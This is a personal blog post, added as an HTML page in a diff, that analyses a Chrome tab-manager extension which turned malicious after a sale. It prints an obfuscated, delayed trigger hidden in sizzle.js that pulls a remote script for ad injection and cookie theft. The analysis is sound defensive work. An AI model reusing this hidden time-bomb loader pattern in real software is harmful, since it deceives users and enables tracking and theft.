@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+        
+        <title>How a chrome extension turned to the Dark Side</title>
+        <style>
+
+    html body {
+        font-family: 'Raleway', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: #5c7b1e;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="http://localhost:1313//css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
+
+
+ <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+
+     <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/haskell.min.js"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/kotlin.min.js"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/scala.min.js"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/swift.min.js"></script> 
+
+    <script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.31" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-33248471-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-33248471-1');
+        </script>
+        
+    </head>
+
+    <body>
+         
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">How a chrome extension turned to the Dark Side</a>
+
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="/">Home</a></li>
+                            
+                                <li><a href="/posts/">Posts</a></li>
+                            
+                                <li><a href="/projects/">Projects</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="mailto:onar@outlook.com"><i class="fa fa-envelope-o"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://github.com/onaralili/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/onaralili/"><i class="fa fa-twitter"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://www.linkedin.com/in/onaralili/"><i class="fa fa-linkedin"></i></a></li>
+                            
+                        </ul>
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/posts/maliciousbrowserextension/">How a chrome extension turned to the Dark Side</a></h4>
+    <h5>May 14, 2018</h5>
+     <kbd class="item-tag">chrome</kbd>  <kbd class="item-tag">extension</kbd>  <kbd class="item-tag">browser</kbd>  <kbd class="item-tag">malicious extension</kbd> 
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<p><em>This is a short story and malware analysis of a chrome extension that served people well then the developer sell it to the malicious advertisement company.</em></p>
+
+<h3 id="discovery">Discovery</h3>
+
+<p>As you may know, recently I have published an extension (yes! one more tab manager for the world) <a href="https://chrome.google.com/webstore/detail/splitup-tab-manager/bhoodecbejheonelhikcfahgpgahffmf">SplitUp! - Tab Manager</a>. I was looking for a way to improve it and Chrome Web Store is a great place to see other extensions to get inspired for new ideas. I searched &ldquo;tab manager&rdquo; to get a general list, then I saw this extension with 50K+ users, well the name of the extension wasn&rsquo;t so hard to guess &ldquo;Tab Manager&rdquo; 🤔 but I guess this is what people search.
+<img src="/images/screenshot.png" alt="Tab Manager extension screenshot on web store" /></p>
+
+<h3 id="bad-smell">Bad smell</h3>
+
+<p>I checked screenshots and decided read reviews to see what people say about it. Well, they were not great. Apparently, from the latest update, the extension showed some malicious behavior such as injecting ads into users&rsquo; search result without users&rsquo; contest.  It seemed like many people have already reported the extension but no action has been taken until recently it has been removed. It says usually it takes 2-3 weeks for the extension to be removed from the store. The good news is that after Google flags an extension as a malware, the extension automatically being removed from the current users&rsquo; browsers. Before it got deleted, I managed to do some analyzes on it and try to see what exactly this extension tries to achieve and how. Since I wasn&rsquo;t really sure what exactly other than ads injection this extension capable of. I decided to utilize my virtual machine for this and install it there.
+<img src="/images/review1.png" alt="Review about Tab Manager on web store" />
+<img src="/images/review2.png" alt="Review about Tab Manager on web store" /></p>
+
+<h3 id="deep-down-to-the-code">Deep down to the code</h3>
+
+<p>First of all, the extension doesn&rsquo;t act maliciously for a while. Once you install it, it stores the current date in the local storage, here the piece of code that was taken from the source</p>
+
+<pre><code>chrome.runtime.onInstalled.addListener(function() {
+  chrome.storage.local.set({
+    time: new Date().getTime()
+  });
+});
+</code></pre>
+
+<p>This was interesting, at the beginning I didn&rsquo;t quite get why this weird date saves to the storage and no ads showing in my search result as reported by users and the extension made no network activity. The extension also blocked <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a> and <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">X-Frame-Options</a> which could mean the extension uses some kind of Command and Control technique to get instruction or get some kind of javascript file from an external source. I decided to dig in a bit more which led me to think that there must some code checking for time or something.</p>
+
+<h4 id="it-is-there">It is there</h4>
+
+<p>&ldquo;Tab Manager&rdquo; uses React to render UI and Sizzle CSS Selector. After Searching the files for a while for the suspicious behavior I came across abnormal local storage check in sizzle.js :</p>
+
+<pre><code>chrome.storage.local.get('time', function (res) {
+      if (res.time) {
+        var time = (new Date().getTime() - res.time) / 3600000;
+        if (time &gt;= 8) {
+          slzzle[1][
+            (function (nextNode) {
+              var attrNames = nextNode[0].attr[index];
+              return attrNames.replace(/\&gt;/g, '|').split('|')[1];
+            })(slzzle)
+          ][
+            []
+              .concat(appendTypes)
+              .concat(nodeType[0].replace('c', nodeType[index][0].toUpperCase()))
+              .join('')
+          ](element);
+
+          // remove after created for pseudo elements
+          element[nodeType[1]].removeChild(slzzle[index].tag);
+        }
+      }
+    });
+  })(xpathcurcssesace(document));
+</code></pre>
+
+<p>Boom! this is it! As you see the code checks if a user has been using the extension for a while since I was a new user it behaved as expected. I brought forward my machine&rsquo;s time to a year early and gave a try to extension again.</p>
+
+<h3 id="request-to-the-dark-side">Request to the dark side</h3>
+
+<p>As expected, the extension started to make an HTTP request to an external source and downloaded a 665KB javascript file which instructs the extension to inject ads, steal and set cookies and so on.
+<img src="/images/httprequest.png" alt="malicious http request by the extension" />
+It is 10913 lines code inside the file and I am not going to into details, a few interesting points are a huge amount of HTTP request and new javascript files are being downloaded based on the website user visits. They made sure that sure will have a native ads experience on every page, hence in every website a new instruction is being downloaded. Every click is recorded in cookies and also send to remote URL. The huge number of websites are covered, from Russian email services mail.ru, yandex.ru to almost all social networks, search engines etc.
+<img src="/images/fb.png" alt="url check for facebook" /></p>
+
+<p>In case a user is on the bitconnect registration form it injects ads to the form
+<img src="/images/registration.png" alt="registration form" /></p>
+
+<p>It seems like some domains are ignored such as paypal, google drive and .gov domains.
+<img src="/images/ignoredDomains.png" alt="ignored domains" /></p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Unfortunately, these days some developers sell their extension after it gains popularity. This is a huge risk since already downloaded extension will get updated with malicious code without user&rsquo;s contest. It has been showing that Chrome Web Store automatic code check is not perfect for detecting this kind of malicious behaviors. The best solution seems to be conscious and uses an extension that is come from a reliable source or open-source. Although, this extension was an open-source project and it still managed to inject people&rsquo;s browser activities.</p>
+</div>
+
+    
+    
+
+    
+
+    
+
+        <h4 class="page-header">Comments</h4>
+
+        <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "onaralili" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+    
+
+</main>
+
+        <footer>
+
+
+        </footer>
+       
+    <script data-no-instant>document.write('<script src="/livereload.js?port=1313&mindelay=10"></' + 'script>')</script></body>
+
+</html>
+
